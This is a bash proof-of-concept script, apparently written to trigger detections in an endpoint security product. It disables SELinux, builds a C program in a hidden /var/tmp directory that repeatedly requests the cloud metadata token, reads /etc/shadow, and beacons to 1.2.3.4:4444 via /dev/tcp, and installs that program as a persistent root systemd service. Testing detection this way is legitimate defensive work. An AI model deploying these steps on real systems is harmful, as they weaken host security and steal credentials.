#!/bin/bash
# S1_PoC: Pure Infostealer & Defense Evasion Scenario
echo "[*] Starting S1_PoC Infostealer Scenario (Theme: Info)..."

# 1. 작업 경로 변경
WORKDIR="/var/tmp/.S1_Info"
sudo mkdir -p $WORKDIR
cd $WORKDIR

sudo setenforce 0 2>/dev/null || echo "SELinux not enforced, skipping."

# 2. C 코드 수정 (바이너리 명칭 및 부하 로직 최적화)
cat << 'EOF' > s1_info.c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

int main() {
    printf("S1_PoC Infostealer Active. Focus: Credential Access\n");
    
    // 자식 프로세스 1: 정보 탈취 행위 (IMDS 및 민감 파일)
    if (fork() == 0) {
        while(1) {
            // A. 클라우드 IMDS 토큰 요청 (S1 탐지 포인트)
            system("curl -s -m 1 http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token -H 'Metadata-Flavor: Google' > /dev/null 2>&1");
            
            // B. OS 자격 증명 파일 접근
            system("cat /etc/shadow > /dev/null 2>&1");
            system("cat /etc/passwd > /dev/null 2>&1");
            
            sleep(30);
        }
    } 
    
    // 자식 프로세스 2: C2 비콘 통신 흉내
    if (fork() == 0) {
        while(1) {
            system("timeout 0.1 bash -c 'echo > /dev/tcp/1.2.3.4/4444' 2>/dev/null");
            sleep(20);
        }
    }

    // 부모 프로세스: 인포스틸러답게 조용히 대기 (CPU 점유율 낮춤)
    while(1) { 
        sleep(10); 
    } 
    return 0;
}
EOF

# 3. 컴파일 및 바이너리 이름 변경 (xmrig -> s1_info)
sudo gcc s1_info.c -o s1_info 2>/dev/null || sudo cp /usr/bin/yes ./s1_info
sudo chmod +x s1_info

# 4. 서비스 파일 생성 (S1_Info.service)
cat << 'EOF' | sudo tee /etc/systemd/system/S1_Info.service > /dev/null
[Unit]
Description=S1_PoC System Info Collection Service
[Service]
ExecStart=/var/tmp/.S1_Info/s1_info
Restart=always
User=root
[Install]
WantedBy=multi-user.target
EOF

# 5. 서비스 시작
sudo systemctl daemon-reload
sudo systemctl start S1_Info.service

sudo systemctl status S1_Info.service

echo "[+] Infostealer Scenario is running."
echo "[+] Service: S1_Info.service"
echo "[+] Binary: /var/tmp/.S1_Info/s1_info"